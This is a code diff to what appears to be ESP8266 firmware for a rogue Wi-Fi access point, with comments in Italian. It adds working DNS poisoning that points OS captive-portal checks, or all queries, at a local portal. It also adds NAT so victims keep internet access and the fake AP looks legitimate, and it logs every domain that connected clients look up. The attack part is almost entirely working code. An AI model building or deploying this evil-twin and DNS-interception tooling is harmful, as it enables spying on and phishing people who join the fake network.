@@ -90,10 +90,18 @@ int probeCount = 0;
 
 String sniffLog[20];
 int sniffCount = 0;
-IPAddress dnsClientIP;
-uint16_t dnsClientPort = 0;
-bool dnsPending = false;
-uint32_t dnsPendingAt = 0;
+
+// tabella query DNS in volo (fino a 8 client in parallelo)
+struct DnsPending {
+  uint16_t id;
+  IPAddress ip;
+  uint16_t port;
+  uint32_t at;
+  bool used;
+};
+DnsPending dnsTab[8];
+
+bool naptInitDone = false;
 
 void sniffPush(const String &s) {
   for (int k = 0; k < sniffCount; k++) if (sniffLog[k] == s) return;
@@ -103,7 +111,49 @@ void sniffPush(const String &s) {
 }
 
 WiFiUDP dnsSrv;
+WiFiUDP dnsUp;
 WiFiServer portalSrv(80);
+
+// NAPT: le tabelle vanno inizializzate UNA volta, altrimenti ip_napt_enable
+// non fa passare nulla (client senza internet).
+// IMPORTANTE: NAPT si abilita sull'interfaccia SOFTAP (192.168.4.1), non sulla
+// STA. La variante lwip2 "Lower Memory" (no IPv6) ha IP_NAPT=1.
+#if IP_NAPT
+bool naptUp = false;
+
+void naptOn() {
+  if (naptUp) return;               // già attivo: non ri-toccare le tabelle
+  if (!naptInitDone) {
+    err_t e = ip_napt_init(IP_NAPT_MAX, IP_PORTMAP_MAX);
+    naptInitDone = (e == ERR_OK);
+    Serial.printf("[napt] init=%d max=%d/%d heap=%d\n", (int)e,
+                  (int)IP_NAPT_MAX, (int)IP_PORTMAP_MAX, ESP.getFreeHeap());
+    if (!naptInitDone) return;
+  }
+#ifdef SOFTAP_IF
+  err_t r = ip_napt_enable_no(SOFTAP_IF, 1);
+#else
+  err_t r = ip_napt_enable((uint32_t)WiFi.softAPIP(), 1);
+#endif
+  if (r != ERR_OK) r = ip_napt_enable((uint32_t)WiFi.softAPIP(), 1);
+  Serial.printf("[napt] enable ret=%d ap=%s sta=%s\n", (int)r,
+                WiFi.softAPIP().toString().c_str(),
+                WiFi.localIP().toString().c_str());
+  naptUp = (r == ERR_OK);
+}
+
+void naptOff() {
+#ifdef SOFTAP_IF
+  ip_napt_enable_no(SOFTAP_IF, 0);
+#endif
+  ip_napt_enable((uint32_t)WiFi.softAPIP(), 0);
+  if (naptUp) Serial.println("[napt] disabled");
+  naptUp = false;
+}
+#else
+void naptOn() {}
+void naptOff() {}
+#endif
 
 // ============ crc8 ============
 uint8_t crc8(const uint8_t *d, int n) {
@@ -322,26 +372,72 @@ void feedRx(const uint8_t *d, int n) {
   }
 }
 
-// ============ DNS (poison o forward) ============
+// ============ DNS: log di tutti i domini + portal sui captive-check ============
+bool isCaptiveHost(const String &h) {
+  static const char *hosts[] = {
+    "captive.apple.com",
+    "captive.gstatic.com",
+    "connectivitycheck.gstatic.com",
+    "connectivitycheck.android.com",
+    "clients3.google.com",
+    "clients4.google.com",
+    "detectportal.firefox.com",
+    "nmcheck.gnome.org",
+    "msftconnecttest.com",
+    "msftncsi.com",
+    "networkcheck.kde.org",
+    "wifi.google.com"
+  };
+  for (unsigned i = 0; i < sizeof(hosts) / sizeof(hosts[0]); i++) {
+    if (h == hosts[i] || h.endsWith(String(".") + hosts[i])) return true;
+  }
+  return false;
+}
+
+void dnsPoison(uint8_t *q, int n, const IPAddress &cip, const IPAddress &client, uint16_t cport) {
+  if (n + 16 > 512) return;
+  q[2] = 0x81; q[3] = 0x80;         // QR=1, RD+RA
+  q[4] = 0; q[5] = 0;               // NSCOUNT
+  q[6] = 0; q[7] = 1;               // ANCOUNT
+  q[8] = 0; q[9] = 0; q[10] = 0; q[11] = 0;
+  uint8_t ans[16] = {0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01,
+                     0x00, 0x00, 0x00, 0x3C, 0x00, 0x04,
+                     cip[0], cip[1], cip[2], cip[3]};
+  dnsSrv.beginPacket(client, cport);
+  dnsSrv.write(q, n);
+  dnsSrv.write(ans, sizeof(ans));
+  dnsSrv.endPacket();
+}
+
 void dnsTick() {
   if (!rogue) return;
-  int ps = dnsSrv.parsePacket();
-  if (ps <= 0) return;
-  if (dnsFwd && dnsSrv.remotePort() == 53) {
-    if (dnsPending && millis() - dnsPendingAt > 4000) dnsPending = false;
-    static uint8_t rp[512];
-    int rn = dnsSrv.read(rp, sizeof(rp));
-    if (dnsPending && rn > 0) {
-      dnsSrv.beginPacket(dnsClientIP, dnsClientPort);
-      dnsSrv.write(rp, rn);
+
+  // 1) risposte upstream → rimanda al client che aveva quella query (per txid)
+  int u;
+  while ((u = dnsUp.parsePacket()) > 0) {
+    static uint8_t rb[512];
+    int rn = dnsUp.read(rb, sizeof(rb));
+    if (rn < 12) continue;
+    uint16_t id = ((uint16_t)rb[0] << 8) | rb[1];
+    for (int i = 0; i < 8; i++) {
+      if (!dnsTab[i].used || dnsTab[i].id != id) continue;
+      if (millis() - dnsTab[i].at > 6000) { dnsTab[i].used = false; continue; }
+      dnsSrv.beginPacket(dnsTab[i].ip, dnsTab[i].port);
+      dnsSrv.write(rb, rn);
       dnsSrv.endPacket();
-      dnsPending = false;
+      dnsTab[i].used = false;
+      break;
     }
-    return;
   }
+
+  // 2) query dei client del rogue AP
+  if (dnsSrv.parsePacket() <= 0) return;
   static uint8_t q[512];
   int n = dnsSrv.read(q, sizeof(q));
   if (n < 17) return;
+  IPAddress cip = dnsSrv.remoteIP();
+  uint16_t cport = dnsSrv.remotePort();
+
   String qn;
   int o = 12;
   while (o < n && q[o] > 0 && q[o] < 64 && o + 1 + q[o] <= n) {
@@ -352,33 +448,34 @@ void dnsTick() {
     qn += '.';
     o += q[o] + 1;
   }
-  if (qn.length() > 4) {
+  if (qn.length() > 1) {
     qn.remove(qn.length() - 1);
     sniffPush("D:" + qn);
   }
-  dnsClientIP = dnsSrv.remoteIP();
-  dnsClientPort = dnsSrv.remotePort();
-  if (!dnsFwd) {
-    // FIX #3: captive portal IP dinamico, non hardcoded
-    IPAddress cip = WiFi.softAPIP();
-    q[2] = 0x85; q[3] = 0x80;
-    q[6] = 0; q[7] = 1;
-    uint8_t ans[16] = {0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01,
-                       0x00, 0x00, 0x00, 0x01, 0x00, 0x04,
-                       cip[0], cip[1], cip[2], cip[3]};
-    dnsSrv.beginPacket(dnsClientIP, dnsClientPort);
-    dnsSrv.write(q, n);
-    dnsSrv.write(ans, sizeof(ans));
-    dnsSrv.endPacket();
-  } else {
-    IPAddress up = WiFi.dnsIP();
-    if (up == IPAddress(0, 0, 0, 0)) return;
-    dnsSrv.beginPacket(up, 53);
-    dnsSrv.write(q, n);
-    dnsSrv.endPacket();
-    dnsPending = true;
-    dnsPendingAt = millis();
+
+  // ibrido: captive-check → portal sull'AP; tutto il resto → DNS upstream
+  if (!dnsFwd || isCaptiveHost(qn)) {
+    dnsPoison(q, n, WiFi.softAPIP(), cip, cport);
+    return;
   }
+  IPAddress up = WiFi.dnsIP();
+  if (up == IPAddress(0, 0, 0, 0)) { dnsPoison(q, n, WiFi.softAPIP(), cip, cport); return; }
+  dnsUp.beginPacket(up, 53);
+  dnsUp.write(q, n);
+  dnsUp.endPacket();
+
+  uint16_t id = ((uint16_t)q[0] << 8) | q[1];
+  int slot = -1;
+  for (int i = 0; i < 8; i++) {
+    if (dnsTab[i].used && millis() - dnsTab[i].at > 6000) dnsTab[i].used = false;
+    if (!dnsTab[i].used && slot < 0) slot = i;
+  }
+  if (slot < 0) slot = 0;
+  dnsTab[slot].id = id;
+  dnsTab[slot].ip = cip;
+  dnsTab[slot].port = cport;
+  dnsTab[slot].at = millis();
+  dnsTab[slot].used = true;
 }
 
 // ============ Captive portal HTTP ============
@@ -660,6 +757,8 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       // FIX #6: mode esplicito prima di softAP
       WiFi.mode(WIFI_AP_STA);
       delay(50);
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
+                        IPAddress(255, 255, 255, 0));
       if (!WiFi.softAP(rogueSsid, pw ? roguePass : NULL, apChannel)) {
         sendFrame(0x13, 0x02, (const uint8_t *)"softAP fail", 11);
         break;
@@ -667,13 +766,17 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       delay(300);
       dnsSrv.stop();
       dnsSrv.begin(53);
+      dnsUp.stop();
+      dnsUp.begin(0);              // socket upstream su porta effimera
       portalSrv.stop();
       portalSrv.begin();
+      for (int i = 0; i < 8; i++) dnsTab[i].used = false;
       rogue = true;
       sniffCount = 0;
-      // FIX #7: NAPT solo se STA è effettivamente up
-      ip_napt_enable((uint32_t)WiFi.localIP(), 1);
-      Serial.printf("[rogue] %s ch%d dns=%s napt=1\n", rogueSsid, apChannel, dnsFwd ? "forward" : "poison");
+      // FIX #7: NAPT (init tabelle + enable) solo se STA è up
+      naptOn();
+      Serial.printf("[rogue] %s ch%d dns=%s napt=1 portal=%s\n", rogueSsid, apChannel,
+                    dnsFwd ? "hybrid" : "poison", dnsFwd ? "captive-only" : "all");
       sendFrame(0x13, 0x00, nullptr, 0);
       break;
     }
@@ -681,13 +784,12 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
     case 0x14: {
       rogue = false;
       dnsFwd = false;
-      dnsPending = false;
+      for (int i = 0; i < 8; i++) dnsTab[i].used = false;
       sniffCount = 0;
       dnsSrv.stop();
+      dnsUp.stop();
       portalSrv.stop();
-      if (WiFi.status() == WL_CONNECTED) {
-        ip_napt_enable((uint32_t)WiFi.localIP(), 0);
-      }
+      naptOff();
       WiFi.softAPdisconnect(true);
       delay(200);
       WiFi.mode(WIFI_STA);
@@ -756,11 +858,9 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
 
     case 0x18: {
       if (plen < 2) { sendFrame(0x18, 0x02, (const uint8_t *)"bad args", 8); break; }
-      if (WiFi.status() == WL_CONNECTED) {
-        ip_napt_enable((uint32_t)WiFi.localIP(), pl[0] ? 1 : 0);
-      }
+      if (pl[0]) naptOn(); else naptOff();
       dnsFwd = pl[1] != 0;
-      dnsPending = false;
+      for (int i = 0; i < 8; i++) dnsTab[i].used = false;
       Serial.printf("[nat] %d dnsFwd=%d\n", pl[0], pl[1]);
       sendFrame(0x18, 0x00, nullptr, 0);
       break;
@@ -881,7 +981,7 @@ void loop() {
     static uint32_t lastNapt = 0;
     if (rogue && millis() - lastNapt > 30000) {
       lastNapt = millis();
-      ip_napt_enable((uint32_t)WiFi.localIP(), 1);
+      naptOn();
     }
   }
 
